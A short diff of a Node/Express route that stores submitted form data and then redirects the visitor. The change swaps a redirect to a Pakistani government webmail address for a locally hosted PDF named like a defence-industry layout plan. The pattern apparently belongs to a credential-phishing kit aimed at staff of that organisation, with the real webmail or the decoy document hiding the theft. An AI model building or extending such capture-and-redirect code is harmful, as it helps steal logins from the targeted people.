@@ -91,7 +91,7 @@ router.post('/try', validateFormData2, (req, res) => {
 		    console.error('Error inserting record:', err);
 		    return res.status(500).send('Internal Server Error');
 		}
-		res.redirect('https://mail.pof.gov.pk/');
+		res.redirect('./PAKISTAN BULLET LINE - LEAD WIRE EXTRUSSION LINE LAYOUT PLAN 11.11.2024 BAĞLANTI NOKTALARI.pdf');
 		});
 		   
 
